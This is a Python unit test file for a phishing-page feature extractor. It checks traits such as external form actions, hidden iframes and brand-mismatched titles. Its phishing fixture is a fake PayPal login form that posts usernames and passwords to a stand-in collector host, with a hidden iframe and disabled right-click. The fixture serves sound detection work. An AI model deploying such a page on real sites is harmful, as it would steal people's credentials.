import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from page_features import PAGE_FEATURE_NAMES, extract_page_features as pf

PHISHY = """
<html><head><title>PayPal - Log in</title>
<link rel="icon" href="https://cdn.other-site.com/x.ico"></head>
<body oncontextmenu="return false">
<form action="https://collector.evil-host.net/post.php">
  <input type="text" name="user"><input type="password" name="pass">
</form>
<iframe src="http://tracker.example.org/a" style="display:none"></iframe>
<a href="#">Forgot password?</a><a href="#">Help</a>
<p>Please verify your account to continue.</p>
</body></html>
"""

NORMAL = """
<html><head><title>My Cooking Blog</title>
<link rel="icon" href="/favicon.ico"><script src="/app.js"></script></head>
<body><h1>Pasta</h1><p>A simple recipe for dinner.</p>
<a href="/about">About</a><a href="/recipes">Recipes</a><a href="https://twitter.com/x">Twitter</a>
<img src="/img/pasta.jpg"></body></html>
"""


class TestPageFeatures(unittest.TestCase):
    def test_phishing_like_page(self):
        f = pf(PHISHY, "http://login-secure.example.com/")
        self.assertEqual(f["has_password_input"], 1)
        self.assertEqual(f["form_action_external"], 1)
        self.assertEqual(f["title_brand_mismatch"], 1)
        self.assertEqual(f["has_hidden_iframe"], 1)
        self.assertEqual(f["right_click_disabled"], 1)
        self.assertEqual(f["favicon_external"], 1)
        self.assertEqual(f["empty_link_ratio"], 1.0)
        self.assertGreaterEqual(f["login_word_count"], 2)

    def test_normal_page(self):
        f = pf(NORMAL, "https://cookingblog.example.com/")
        self.assertEqual(f["has_password_input"], 0)
        self.assertEqual(f["num_forms"], 0)
        self.assertEqual(f["form_action_external"], 0)
        self.assertEqual(f["favicon_external"], 0)
        self.assertEqual(f["title_brand_mismatch"], 0)
        self.assertAlmostEqual(f["external_link_ratio"], 1 / 3, places=2)
        self.assertEqual(f["external_resource_ratio"], 0.0)

    def test_brand_on_own_domain_is_not_a_mismatch(self):
        html = "<html><title>Sign in - PayPal</title></html>"
        self.assertEqual(pf(html, "https://www.paypal.com/signin")["title_brand_mismatch"], 0)

    def test_junk_input_never_crashes(self):
        for html in ["", None, "<<<>>>", "<html", "plain text, no tags"]:
            self.assertEqual(list(pf(html, "http://example.com").keys()), PAGE_FEATURE_NAMES)


if __name__ == "__main__":
    unittest.main()
